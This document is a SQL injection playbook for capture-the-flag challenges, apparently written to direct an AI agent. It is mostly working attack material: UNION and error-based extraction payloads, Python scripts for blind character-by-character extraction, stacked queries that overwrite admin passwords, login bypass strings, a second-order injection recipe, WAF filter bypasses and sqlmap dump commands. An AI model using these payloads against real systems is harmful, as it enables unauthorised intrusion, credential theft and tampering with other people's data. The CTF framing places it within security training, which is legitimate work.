## SQL Injection Playbook

### Workflow: Discover Inputs → Confirm Injection → Identify DB → Enumerate → Exfiltrate

**Step 0 — Discover ALL input points (CRITICAL — do this FIRST):**
Many SQLi challenges use POST forms, not GET parameters. You MUST test both:
1. **Parse HTML forms**: `curl -sL TARGET/ | grep -i '<form\|<input\|action=\|method='`
2. **Identify form fields**: Look for `name=` attributes in `<input>`, `<select>`, `<textarea>` elements
3. **Check form method**: `method="POST"` requires POST requests, NOT GET
4. **Include hidden fields**: Look for `<input type="hidden"` — these MUST be included in your request
5. **Include submit button**: If the form has `name="submit"` on the button, include `submit=true` in POST data
6. **Test ALL endpoints**: Check `/login`, `/search`, `/send`, `/contact`, `/api`, `/query`, etc.

**CRITICAL**: If you see a form like:
```html
<form action="send.php" method="POST">
  <input name="fullname">
  <input name="email">
  <button name="submit">Send</button>
</form>
```
You MUST test with: `curl -X POST TARGET/send.php -d 'fullname=test&email=test@test.com&submit=true'`
Do NOT just `curl TARGET/send.php?fullname=test` — POST forms don't work with GET parameters.

**Step 1 — Entry point detection & confirmation:**
Test parameters with escalating escape sequences:
```
[Nothing]  '  "  `  ')  ")  `)  '))  "))  `))
```
**Test BOTH GET and POST for EVERY parameter you find:**
```bash
# GET test
curl -sL "TARGET/search.php?username=admin'"
# POST test (use -d for form data)
curl -sL -X POST TARGET/send.php -d "fullname=admin'&email=test@t.com&submit=true"
```
Confirm with logical operations:
- `?id=1 OR 1=1--` (true) vs `?id=1 AND 1=2--` (false) — different response = SQLi
- Math: `?id=2-1` same as `?id=1` = injectable
- Timing: `1' AND SLEEP(3)--` (MySQL), `1' || pg_sleep(3)--` (PG), `1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))` (SQLite)
- **ALWAYS test POST too**: `curl -X POST TARGET/endpoint -d "param=1' AND SLEEP(3)--"`
- For GraphQL: introspect schema first, then test query parameters

**Stage 2 — Identify DB type:**
- MySQL errors: `You have an error in your SQL syntax`; functions: `connection_id()=connection_id()`, `conv('a',16,2)=conv('a',16,2)`
- PostgreSQL errors: `ERROR: syntax error at or near`; functions: `5::int=5`, `pg_client_encoding()=pg_client_encoding()`
- SQLite errors: `SQLITE_ERROR`; functions: `sqlite_version()=sqlite_version()`, `last_insert_rowid()>1`
- MSSQL: `@@CONNECTIONS>0`, `BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)`
- DB version: MySQL `@@version`, PG `version()`, SQLite `sqlite_version()`, MSSQL `@@version`

**Stage 3 — UNION-based enumeration:**
Detect column count:
- `' ORDER BY 1--`, `' ORDER BY 2--`, ... until error
- Or: `' UNION SELECT null--`, `' UNION SELECT null,null--`, ... until success (use `null` — works for any type)

Extract schema:
```sql
# MySQL/PG — databases, tables, columns
-1' UNION SELECT 1,2,group_concat(schema_name) FROM information_schema.schemata--
-1' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--
-1' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='TARGET_TABLE'--
# SQLite
' UNION SELECT 1,name FROM sqlite_master WHERE type='table'--
' UNION SELECT 1,sql FROM sqlite_master WHERE name='TARGET_TABLE'--
```

**Stage 4 — Exfiltrate flag:**
- `' UNION SELECT flag FROM flags--` or similar
- Read files: `' UNION SELECT load_file('/flag.txt')--` (MySQL)
- If same column count: `0 UNION SELECT * FROM flag`
- Access column by position (no name): `SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM flags)F`

### Error-based extraction (when UNION fails but errors show)
```sql
# MySQL — extractvalue/updatexml
' AND extractvalue(1,concat(0x7e,(SELECT flag FROM flags limit 1)))--
' AND updatexml(1,concat(0x7e,(SELECT @@version)),1)--
# MySQL — floor
' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT flag FROM flags limit 1),0x3a,floor(rand()*2))x FROM information_schema.tables GROUP BY x)a)--
```

### Escalation Path
1. **Manual curl/requests** — test a few payloads manually
2. **sqlmap** — after confirming injection point: `sqlmap -u "URL?param=1" --batch --dbs` then `--dump`
3. **sqlmap for POST**: `sqlmap -u URL --data "user=test&pass=test" --batch --dbs`
4. **Custom Python** — when sqlmap fails or for complex scenarios

### GraphQL SQLi (use Python — curl breaks on nested JSON)
```python
import requests
URL = "TARGET/graphql/"
# Introspect
r = requests.post(URL, json={"query": "{__schema{queryType{fields{name args{name type{name}}}}}}"})
print(r.text)
# Test injection
r = requests.post(URL, json={"query": "{ query(param: \"' OR 1=1--\") { id name } }"})
print(r.text)
```

### Blind SQLi (no visible output)

**Boolean-based** — response differs for true vs false:
```python
import requests
# Find a baseline: true condition returns X, false returns Y
true_r = requests.get("TARGET?id=1' AND 1=1--")
false_r = requests.get("TARGET?id=1' AND 1=2--")
if len(true_r.text) != len(false_r.text):
    print("Boolean blind SQLi confirmed!")
    # Extract data char by char
    for pos in range(1, 50):
        for c in range(32, 127):
            r = requests.get(f"TARGET?id=1' AND ASCII(SUBSTR((SELECT flag FROM flags),{pos},1))={c}--")
            if len(r.text) == len(true_r.text):
                print(chr(c), end='', flush=True)
                break
```

**Error blind** — trigger error on true, no error on false:
```sql
' AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```

**Time-based** — measure response time:
```python
import requests, time
start = time.time()
requests.get("TARGET?id=1' AND SLEEP(3)--")  # MySQL
# requests.get("TARGET?id=1' || pg_sleep(3)--")  # PostgreSQL
# SQLite: "TARGET?id=1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))"
if time.time() - start > 2:
    print("Time-based blind SQLi confirmed!")
```

### Stacked Queries (MySQL, MSSQL, PG — not Oracle)
When UNION fails, try stacked queries (`;`):
```sql
'; INSERT INTO users (username,password) VALUES ('hacker','hacked')--
'; UPDATE users SET password='hacked' WHERE username='admin'--
```

### Authentication Bypass
Try these as username (password = anything):
```
admin' OR 1=1--
admin'--
' OR ''='
' OR 1=1#
admin')--
' UNION SELECT 1,'admin','KNOWN_HASH'--
```
Polyglot (works across contexts): `SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/`

### Two-stage / "Stored-then-reused" SQLi (second-order injection)
When source shows TWO queries where the RESULT of query 1 (often `$row['username']`) is reinjected unescaped into query 2:
```php
// Query 1 — vulnerable
$check = mysqli_query($db, "SELECT username FROM users WHERE username = '$realusername'");
$usernamenew = $row['username'];   // ← whatever this row contains
// Query 2 — also uses $usernamenew unescaped
mysqli_query($db, "SELECT user_id FROM users WHERE username = '$usernamenew' AND password = MD5(...)");
```
You can carry SQL syntax THROUGH query 1 into query 2 by UNION-injecting a fake `username` column whose value is itself a SQL fragment:
```sql
-- realusername:
' UNION SELECT 'admin\' OR 1=1-- ' --

-- After query 1 runs:
--   row['username'] = "admin' OR 1=1-- "
-- Query 2 becomes:
--   SELECT user_id FROM users WHERE username = 'admin' OR 1=1-- AND password = ...
-- → returns first user → login succeeds (no password needed)
```
Test recipe (URL-encode quotes in the body):
```python
import requests
base = "http://TARGET/index.php"
payload = "' UNION SELECT 'admin\\' OR 1=1-- ' -- "
r = requests.post(base, data={'username': payload, 'password': 'x', 'submit': 'submit'})
print(r.text)  # look for "Success"
# Then GET /dashboard.php with the session cookie
```

**Recognize this pattern when**:
- Source has 2+ SQL queries where output of one feeds another
- Login responses distinguish "username invalid" vs "password invalid" — gives you a perfect 3-state oracle
- The 1st query reads a column you can fully control via UNION (e.g., `SELECT username FROM users WHERE …`)

**Boolean-blind alternative** (if UNION blocked): the 3-state oracle (`{response: "username"|"password"|"Success"}`) extracts `password` column char-by-char with `' AND SUBSTR(password,N,1)='X' -- ` — but UNION reinjection is faster.

### Filter/WAF Bypass (try in order — CRITICAL for filtered challenges)

**Detect the filter first**: Send payloads that trigger the filter and note the error message.
If you see "filtered", "blocked", "invalid", etc., you need bypass techniques.

1. **Space alternatives** (when spaces are filtered — very common):
   - `/**/` (SQL comment): `admin"/**/OR/**/1=1--`
   - `%09` (tab), `%0a` (newline), `%0c` (form feed): `admin"%09OR%091=1--`
   - Parentheses: `(1)and(1)=(1)`, `admin"OR(1=1)--`
   - No space needed between string/number and keywords: `admin"OR"1"="1`
2. **Keyword alternatives** (when `AND`, `WHERE`, `LIMIT`, etc. are filtered):
   - `AND` → `&&` → `%26%26`
   - `OR` → `||` → `%7C%7C`
   - `WHERE` → use `HAVING` or `ORDER BY CASE WHEN ... THEN 1 ELSE 2 END`
   - `LIMIT` → subqueries: `(SELECT x FROM t ORDER BY id LIMIT 1)` → `(SELECT x FROM t)`
   - `SUBSTRING`/`SUBSTR` → `MID()`, `LEFT()`, `RIGHT()`, or `LPAD()`/`RPAD()`
   - `LIKE` → `REGEXP`, `RLIKE`, or `=`
3. **Case variation**: `UnIoN SeLeCt`, `uNiOn`
4. **Inline comments**: `UN/**/ION SE/**/LECT`, `/*!UNION*/ /*!SELECT*/`
5. **Double-write**: `UNUNIONION SELSELECTECT` (if filter removes once)
6. **No commas**: `LIMIT 1 OFFSET 0` instead of `LIMIT 0,1`; `SUBSTR('SQL' FROM 1 FOR 1)`; `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b`
7. **URL encoding**: `%27` for `'`, `%20` for space, `%22` for `"`
8. **Scientific notation**: `-1' or 1.e(1) or '1'='1`
9. **Column name bypass**: `SELECT F.3 FROM (SELECT 1,2,3 UNION SELECT * FROM table)F`
10. **Hex encoding**: `0x61646d696e` instead of `'admin'`

**Example: Bypass space + keyword filters for blind SQLi:**
```python
import requests
# If spaces AND 'and','where','substr','substring','like','null','limit' are filtered:
# Use /**/ for spaces, mid() for substring, ord() for ascii, || for or
for pos in range(1, 50):
    for c in range(32, 127):
        # Bypass: /**/ for spaces, ORD(MID(...)) instead of ASCII(SUBSTR(...))
        payload = f'admin"/**/&&/**/ORD(MID((SELECT/**/password/**/FROM/**/users),{pos},1))={c}--'
        r = requests.get(f"TARGET/search.php?username={payload}")
        if "User exists" in r.text:
            print(chr(c), end='', flush=True)
            break
```

### Flag Locations
- `flags`, `secrets`, `users` tables — look for `flag`, `password`, `secret` columns
- `' UNION SELECT load_file('/flag.txt')--` for file-based flags
- **Login with extracted credentials**: If you extract a username/password from the DB, try logging in via the app's login form — the flag may be displayed on successful authentication
- Check environment variables: some flags are in `ENV` not in the database
- Try `FLAG`, `flag`, `secret`, `key`, `token` as table/column names

### Common Mistakes to Avoid
- **Do NOT only test GET parameters.** Always check for POST forms. Parse the HTML for `<form method="POST">` and test all form fields.
- **Do NOT give up when you see a WAF/filter message.** Try bypass techniques from the filter bypass section.
- **Do NOT assume the injectable parameter is the first one.** Test ALL parameters in the form.
- **For blind SQLi, always write a Python script** — manual char-by-char extraction via curl is too slow. Use `file_write` to save the script, then run it.
- **If response says "User exists" vs "No results", that's boolean-based blind SQLi.** Write a script to extract data char by char.
- **If you find credentials via blind SQLi, USE THEM** — POST to the login endpoint with extracted username/password to get the flag.
- Hidden rows: `' OR 1=1--` to dump all rows
- Secret categories: `' UNION SELECT ... FROM posts WHERE category='secret'--`
- Hidden UNION-based: if response looks same, try error-based or stacked insert to exfil
